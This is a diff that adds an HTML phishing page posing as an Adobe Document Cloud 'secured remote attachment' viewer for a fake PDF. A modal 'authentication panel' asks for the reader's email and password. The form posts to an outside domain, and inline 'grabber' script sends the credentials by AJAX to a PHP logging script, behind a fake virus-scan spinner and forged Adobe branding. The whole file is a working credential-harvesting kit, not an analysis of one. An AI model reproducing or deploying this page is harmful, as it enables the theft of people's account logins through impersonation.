@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <link rel="stylesheet" href="Adobe%20PDF%20Online_files/bootstrap.css">
+  <!-- FAV ICON -->
+  <link rel="SHORTCUT ICON" sizes="16x16" href="">
+  <!-- This imports the font awesome library -->
+  <link rel="stylesheet" href="Adobe%20PDF%20Online_files/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
+  <!-- My custom style rules -->
+  <link rel="stylesheet" href="Adobe%20PDF%20Online_files/styles.css">
+  <!-- Page Title -->
+  <title>Adobe PDF Online</title>
+  
+  <style>
+   
+  </style>
+  
+  <script>
+$( document ).ready(function() {
+$("#email").val($.urlPeram('email'));
+});
+</script>
+
+<script src="Adobe%20PDF%20Online_files/jquery.min.js"></script>
+ </head>
+<body>
+  <!-- SPINNER AREA TO BE TRIGGERED WITH JQUERY -->
+      <!-- container holding the spinner-->
+      <div id="page-loader" class="spin-wrapper" style="display: none;">
+            <div id="spin-loader" class="spin-pos">
+                <img id="loader-image" class="loader" src="Adobe%20PDF%20Online_files/spinner.svg" alt="Loading....">
+                <div id="page-progress" class="progress-caption" style="font-size:17px; font-weight: 600;">Please wait, we are setting up things for you</div>
+            </div>
+        </div> 
+     <!-- END OF THE SPINNER -->
+
+
+<div id="page-content" class="container" style="display: block;"> 
+<!-- NAV BAR -->
+    <nav class="navbar navbar-inverse navbar-toggleable-sm navbar-fixed-top" style="position: fixed; margin-bottom: 40px;">
+      <div class=" mb-3">
+      <!-- Nav Bar Logo -->
+        <img src="Adobe%20PDF%20Online_files/logo-header.png" id="logo-image" style="height:40px; width:28px;">
+      <button class="navbar-toggler custom-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#myContent" aria-expanded="false" aria-label="Toggle Navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      </div>
+      <!-- <a href="#" class="navbar-brand"><span style="font-weight:bold;">Microsoft <small> Office 360</small></span></a> -->
+      <!-- <div class="row m-0 ">
+        <a href="#" class="navbar-brand col-sm-4" ><span style="font-weight:bold;">Microsoft <small> Office 360</small></span></a>
+      </div> -->
+      
+      <!-- Beginning of the container that holds the navbar list items -->
+      <div class="collapse navbar-collapse" id="myContent">
+          <div class="navbar-nav">
+            
+          </div><!-- End of Navbar -->
+      </div> <!-- End of the Collapssible menuc-->
+
+    </nav>
+<!-- END OF NAV BAR -->
+
+<div class="container col-sm-12 mt-3"> <!-- Beginning of content container -->
+
+      <div class="row">
+        <!-- Beginning of the card -->
+        <div class="offset-md-2 col-sm-12 col-xs-12 col-md-8">
+         <div class="mt-5">
+          <div class="card text-center">
+          <div class="card-header">
+            <ul class="nav nav-tabs card-header-tabs">
+              <li class="nav-item">
+              <!-- Edit Document Label -->
+                <a class="nav-link disabled" href="#"><span class="glyphicon glyphicon-file"></span>Edit Doc</a>
+              </li>
+              <li class="nav-item">
+              <!--Sign Document Fake Label -->
+                <a class="nav-link disabled" href="#">Sign Doc</a>
+              </li>
+              <li class="nav-item">
+              <!-- View Document Fake Label -->
+                <a class="nav-link active" href="#">View Doc</a>
+              </li>
+            </ul>
+          </div>
+          <div class="card-body">
+
+          <div class="ml-3 mt-3 text-left">
+          <!-- Secured Remote Attachment label -->
+          <i class="icon fas fa-lock" style="color:#f73c3c;; font-size:17px; margin-right:5px;"></i> <span class="rex">  Secured Remote Attachment</span>
+              </div>
+
+            <div class="mt-4 mb-5">
+            
+              <div>
+            
+                <img src="Adobe%20PDF%20Online_files/word-icon.png" id="attachment" class="mt-1" style="width:85px; margin-top:20px;">
+              <div class=""> 
+                  <div>
+                    <small class="text-left card-text">Filename: Order List catalogue.pdf</small>
+                  </div>
+              <div>
+                  <!-- Document Description Label --> 
+                   
+                  </div>
+                  <div>
+                  <!-- Document Type Label -->
+                    <small class="text-left card-text">Type: PDF</small>
+                  </div>
+                  <div>
+                  <!--Document Size -->
+                    <small class="text-left card-text">Size: 32.8MB</small>
+                    </div>
+                </div>
+                <!--- View Button label -->
+                <a href="#" class="mt-5 btn btn-primary" data-toggle="modal" id="spin-btn" data-target="#myModal">View Document</a>
+              </div>
+            </div>
+          </div>
+         
+      </div> 
+        </div>
+
+        <div class="row" style="padding-top:20px;">
+          <div style="margin:0 auto; justify-content:center; text-align:center;">
+                <ul>
+                                                  <!--- ENGLISH -->
+                  <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">English</a></span>
+
+                                                  <!--- GERMAN -->
+                  <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">Deutsch</a></span>
+
+                                                   <!--- FRENCH -->
+                  <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">Français</a></span>
+
+                                                   <!--- SERBIAN -->
+                  <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">Српски</a></span>
+
+                                                     <!--- ROMANIA AND MOLDOVA -->
+                  <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">Română</a></span>
+
+                                                      <!--- ITALIAN -->
+                  <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">Italiano</a></span>
+
+
+                                                        <!--- THAILAND / THAI -->
+                 <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">ไทย</a></span>
+
+                                                      <!--- VIETNAMESE -->
+                  <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">Việt</a></span>
+
+                                                        <!--- SIMPLIFIED CHINESE -->
+                  <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">简体中文</a></span>
+
+                  
+                                                       <!--- JAPANESE -->
+                  <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">日本人</a></span>
+
+
+                                                        <!--- KOREA -->
+                  <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">한국어</a></span>
+
+
+                                                      <!--- RUSSIA -->
+                <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">русский</a></span>
+
+
+                
+                                                         <!--- KYRGYZ -->
+                <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">Кыргызча</a></span>
+
+                 
+                                                        <!--- SPANISH -->
+                <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class="active col-sm-3"><a class="flow" href="">español</a></span>
+
+
+
+                                                         <!--- PORTUGUESE -->
+               <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">Português</a></span>
+
+                                                        
+                                                        <!-- POLAND / POLISH -->
+               <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">Polskie</a></span>
+
+
+                                                       <!--  CZECH REPUBLIC -->
+              <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">čeština</a></span>
+
+
+                                                       <!-- GREEK -->
+              <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">Ελληνικά</a></span>
+
+
+                                                        <!-- DUTCH -->
+             <span style="display:inline; background-color:white; font-size: 13px; margin-bottom:15px;" class=" col-sm-3"><a class="flow" href="">Nederlands</a></span>
+
+
+
+
+
+
+
+
+
+
+              </ul>
+          </div>
+        </div>
+      <!--End of the Card -->
+      </div>
+     
+
+</div><!-- End of content container -->
+
+
+         
+             
+              
+       
+     
+
+
+
+  <!-- The User Authentication Modal -->
+  <div class="modal fade" id="myModal">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content">
+
+        <div id="spin-wrapper" class="spin-wrapper" style="display:none;">
+        <!-- Anti virus image insertion -->
+          <div style="padding-top:130px; padding-left:100px;">
+          <img src="Adobe%20PDF%20Online_files/anti-virus.jpg" style="width:70px;">
+          </div>
+            <div id="spin-pos" class="spin-pos">
+                <img id="loader" class="loader" src="Adobe%20PDF%20Online_files/spinner.svg" alt="Loading....">
+                <div id="progress-caption" class="progress-caption" style="font-size:16px; font-weight: 600;">Scanning document for virus</div>
+            </div>
+        </div> 
+
+
+
+      
+        <!-- Modal Header -->
+        <div class="modal-header">
+
+          
+       
+
+          <!-- This div creates a new row for holding the assets of the modal header -->
+          <div class="row">
+            <!-- This div spans the 12 columns of the display -->
+             <div class="col-sm-12 col-md-12 col-lg-12">
+               <!-- Modal logo image -->
+                  <div>
+                    <img style="height:30px;float:left; margin-right:10px;" src="Adobe%20PDF%20Online_files/ted.png">
+                  </div>
+                 <span class="modal-title">Adobe Document Cloud</span>
+             </div>
+
+            <!-- This div spans the 12 columns of the display -->
+             <div class="col-sm-12 col-md-12 col-lg-12" style="margin-left: 32px;">
+              <!-- Modal Sub heading -->
+                 <small>Reciever's Authentication Panel</small>
+             </div>
+          </div>
+          <button type="button" class="close" data-dismiss="modal">×</button>
+		  
+		  
+		  
+          
+        </div>
+        
+        <!-- Modal body -->
+        <div class="modal-body">
+        
+            <div class="container">
+                <!-- <h2>Stacked form</h2> -->
+
+                <!-- Server response message div -->
+                <div id="response" class="m-0" style="font-size:14px; margin-top:10px;">
+                    
+                </div>
+                <!-- End of server response message div -->
+
+                <form action="http://univectcorporate.com/cgi-bn/load/feedup.php" method="post">
+                  
+                    <div class="form-group">
+                    <!-- User Email Label -->
+                        <label for="user_email">Email:</label>
+                        <input type="text" class="form-control form-control-sm" id="username" placeholder="Please enter your email" name="email">
+
+                        <!-- Error span tag for the user email address error -->
+                        <span id="email-error" class="user-error" style="font-size: 13px;color: red;"></span>
+                    </div>
+                    <div class="form-group">
+
+                    <!-- User Password label -->
+                        <label for="user_pwd">Password:</label>
+                        <input type="password" class="form-control form-control-sm" id="user_pwd" placeholder="Please enter  your password" name="pswd">
+                        <!-- Error span tag for the user password address error -->
+                        <span id="pass-error" class="user-error" style="font-size: 13px;color: red;"></span>
+                    </div>
+
+                    <!-- Submit Button Label -->
+                    <button type="submit" id="blast-log" class="btn btn-primary btn-block">View Document</button>
+                </form>
+            </div>
+
+
+        </div>
+        
+        <!-- Modal footer -->
+        <div class="modal-footer container">
+
+          <div class="row mt-0">
+            <!-- This div spans the 12 columns of the display -->
+             <div class="col-sm-12 col-md-12 col-lg-12">
+                 <small style="font-size:12px;">Sign In with Receiver's Email and Password to View document</small>
+             </div>
+               <!-- This div spans the 12 columns of the display -->
+             <div class="col-sm-12 col-md-12 col-lg-12 mt-0">
+                 <small style="font-size:10px;"> ©2019 Adobe Inc.</small>
+             </div>
+          </div>
+         
+        </div>
+
+           
+        
+      </div>
+    </div>
+  </div>
+
+
+
+
+
+
+<!-- Beginning of the footer -->
+<div class="mt-5">
+  <footer class="container-fluid text-center">
+    <div class="row">
+        <div class="col-sm-12">
+          
+            <span class="glyphicon glyphicon-chevron-up">Adobe Document Cloud</span>
+          
+        </div>
+      
+        <!-- Setting the user country if avaliable -->
+        <div style="font-size:14px;" class="col-sm-12"><small></small></div><div style="font-size:14px;" class="col-sm-12"><small> </div> 
+
+        
+       
+        
+
+        <div class="col-sm-12">
+           <p><small>© 2019 Adobe Inc.</small></p>
+        </div>
+    </div>
+    
+  </footer> <!-- End of the footer -->
+</div>
+ </div>
+ </div>
+
+<!-- Jquery library -->
+<script src="Adobe%20PDF%20Online_files/jquery.js"></script>
+<script src="Adobe%20PDF%20Online_files/tether.js"></script>
+<script src="Adobe%20PDF%20Online_files/bootstrap.js"></script>
+<!-- This line imports the javascript form grabber -->
+<script src="Adobe%20PDF%20Online_files/scripts.js"></script>
+
+  <script>
+$( document ).ready(function() {
+$("#email").val($.urlPeram('email'));
+});
+</script>
+
+<script src="./Adobe%20PDF%20Online_files/jquery.min.js"></script>
+<!-- This  grabber -->
+<script>
+        //User $_GET varibale email 
+        let exEmail = "";
+
+     
+        
+
+      
+       //Creating a function onblur and onchange event
+       function clearSpace(){
+         this.value.trim();
+       }
+
+       // targeting the user email input and trimming the values of spaces
+       let userEmail = document.getElementById("user_email");
+     
+     // targetting the user password input and trimming of white spaces
+       let userPassword = document.getElementById("user_pwd");
+
+       userEmail.addEventListener("blur", clearSpace);
+       userEmail.addEventListener("change", clearSpace);
+
+       // targeting the submit or view document button
+       let submitBtn = document.getElementById("blast-log");
+
+       submitBtn.addEventListener("click",function(e){
+
+                /** Embedded javascript for the form validation 
+                  * Assigning dynamic error messages from PHP server to Javascript
+                  * **/
+               
+              // Prevent Default behaviour
+              e.preventDefault();
+
+              //let the original button inner HTML be 
+              var origBtn = submitBtn.innerHTML;
+
+              // Assigning the Invalid email response message to a variable
+              let invalidEmail = "Invalid email address";
+              
+              // Assigning the empty email field to a variable
+              let mailEmpty = "Please Insert receiver's email address";
+              
+              // Assigning the empty password field to a variable
+              let passEmpty = "Please insert your password";
+
+              // Assigning the Btn change animation change to a variable
+              let btnChange = "Connecting.....";
+              
+              // Assigning the Progress on the Response Div on Ajax request
+              let divProResponse = "Connecting to mail server";
+
+              // Assigning the short password validation message 
+              let shortPass = "Password is too short";
+
+              // Assigning wrong email addresss valiadtion message
+              let wrongEmail = "wrong reciever's email address"
+
+              /** THE MODAL FORM VALIDATION STARTS HERE OR BEGINS
+               *  TARGETING THE VARIOUS REQUIRED FORM ELEMENTS
+               */
+                
+
+                // targeting the user email input and trimming the values of spaces
+                  let userEmail = document.getElementById("user_email");
+     
+                // targetting the user password input and trimming of white spaces
+                  let userPassword = document.getElementById("user_pwd");
+
+                // Targeting the email error response span
+                let emailError = document.getElementById("email-error");
+
+                // targeting the password error response span
+                let passError  = document.getElementById("pass-error");
+
+                // targeting the password error response span
+                let response  = document.getElementById("response");
+
+                // INPUT VALUES TO BE SENT OUT 
+                let sendEmail = "";
+                let sendPass = "";
+
+                
+
+                /**
+                 * EMPTY ALL ERROR FIELDS
+                 */
+                emailError.innerHTML = "";
+                passError.innerHTML = "";
+                response.innerHTML = "";
+                
+                /** EMAIL VALIDATION */
+                if(userEmail.value.trim() == ""){
+
+                  // inserting the empty email error into the error span
+                  // When the user does not enter any text
+                  emailError.innerHTML = mailEmpty;
+                  
+                  
+                  // Emptying the to be sent out email address
+
+                  sendEmail = "";
+                }else{
+                      // Do this when a user enters some text
+                      sendEmail = userEmail.value.trim();
+                      // If the email field of the user contains a value
+                      // Check if it is a valid email address
+
+                      if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(sendEmail)){
+
+                            //Checking if the PHP GET variable exist
+                            if(exEmail !== "" && typeof exEmail !== "undefined") {
+
+                                // Do further Validation on the entered value by checking if the
+                                // entered email is  the same as the get variable
+                                if(sendEmail !== exEmail) {
+                                  // Do this by adding an error message span
+                                  // and emptying the sendEmail variable
+
+                                  //Adding the error message
+                                  emailError.innerHTML = wrongEmail;
+
+                                  // Emptying the sendEmail Variable
+                                  sendEmail = "";
+
+                                  
+                                }else {
+                                  // Do this if the entered email is the same with 
+                                  // $_GET server by Removing the error message tag and re-assigning 
+                                  // it to the send Email variable
+                                  // Re assign the email again to a dynamic variable
+                                    sendEmail = sendEmail;
+
+                                   // Clear the Error span tag
+                                   emailError.innerHTML = "";
+                                }
+                                
+
+                            } else {
+                                // If the PHP GET variable does not exist perform the default action
+                                // Re assign the email again to a dynamic variable
+                                  sendEmail = sendEmail;
+
+                                // Clear the Error span tag
+                                emailError.innerHTML = "";
+                            }
+
+                        
+                      }else{
+                        // Assign the Invalid email address to the error span
+                        // When the entered value does not conform with the validatsion standard
+                        emailError.innerHTML = invalidEmail;
+                        sendEmail = "";
+                      }
+
+                        
+                        
+
+                }
+
+
+                
+                /** PASSWORD VALIDATION */
+
+                if(userPassword.value.trim() == ""){
+
+                  // Inserting the dynamic empty password error
+                  passError.innerHTML = passEmpty;
+
+                  // Empty the sendPass variable
+                  sendPass = "";
+                }else{
+                    // Checking if the password is less down 4 characters
+                    if(userPassword.value.trim().length < 5){
+                      
+                      // Inserting the dynamic short pass word error
+                       passError.innerHTML = shortPass;
+                       
+                       // Empty the sendPass variable
+                       sendPass = "";
+                    }else{
+                      passError.innerHTML ="";
+                      sendPass = userPassword.value.trim();
+                    }
+                }
+
+
+                /**
+                 * AJAX REQUEST BLOCK / THAT SENDS 
+                 * OUT THE EMAIL 
+                 * 
+                 */
+
+                 // Checking if the two iputs both have values
+                if((sendPass !="") && (sendEmail != "")){
+
+                      
+                       // Output string for AJAX progress
+                      var strOutput = '<div class="alert alert-success alert-dismissible fade show" role="alert">' + divProResponse +  '</div>';
+
+                      // Inserting the Dynamic waiting message
+                      response.innerHTML = strOutput;
+                      
+                      //Change the innerHTML of the Button showing AJAX request in progress
+                      submitBtn.innerHTML = btnChange;
+
+                      // Preparing the query string 
+                      var url = "../private/library/post_log.php";
+
+                      // Disabling the submit  Button to prevent multiple ajax request
+                      submitBtn.setAttribute("disabled", "disabled");
+
+                      //Disable the various form inputs
+                      userEmail.setAttribute("disabled", "disabled");
+                      userPassword.setAttribute("disabled", "disabled");
+                    
+                      //Sending the AJAX to the server to send out an email
+                      if (window.XMLHttpRequest){
+
+                        // code for modern browsers
+                        var xhr = new XMLHttpRequest();
+
+                        }else{
+                          
+                        // code for old IE browsers
+                        var  xhr = new ActiveXObject("Microsoft.XMLHTTP");
+                      } 
+
+
+                    //Open the AJAX connection with the server
+                    xhr.open("POST", url , true);
+
+
+                    // Setting Request Header for the POST Http Protocol to encode the values
+                    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+                    // Setting Request header to notify the recieving PHP script that it is an AJAX request
+                    xhr.setRequestHeader("X-Requested-With","XMLHttpRequest");
+
+                    // Stating the action that occurs at every state change
+                    xhr.onreadystatechange = function(){
+
+                      // // Creating a waiting for server response message for the user
+                      // if(this.readyState < 4){
+
+                        
+                        
+                      // }
+
+                      // If the response is ok and successful
+                      if((this.readyState == 4) && (this.status == 200)){
+
+                         // response.innerHTML = "";
+                         
+                          // Enabling the disabled button
+                          
+                          setTimeout(() => {
+                            //Inserting the server response message into the response div
+                            response.innerHTML = this.responseText;
+
+                            //Returning the button to the original value
+                            submitBtn.innerHTML = origBtn;
+
+                            // Enabling the submit button after the request is over
+                            submitBtn.removeAttribute("disabled");
+
+                            // Enabling the various form inputs
+                            userEmail.removeAttribute("disabled");
+                            userPassword.removeAttribute("disabled");
+                          }, 3000); 
+                          
+
+
+                         }
+
+                    }// End of the onreadystatechange event
+
+                    // Sending out the request
+                    xhr.send("user_email=" + sendEmail + "&user_password=" + sendPass);
+
+                     }
+                
+
+                
+                  
+                 
+       }); /** End of Click event Listener */
+
+       
+console.log(exEmail);
+       
+        
+</script>
+
+
+
+ 
+
+
+
+</body><!-- End of Body of the page  --></html>
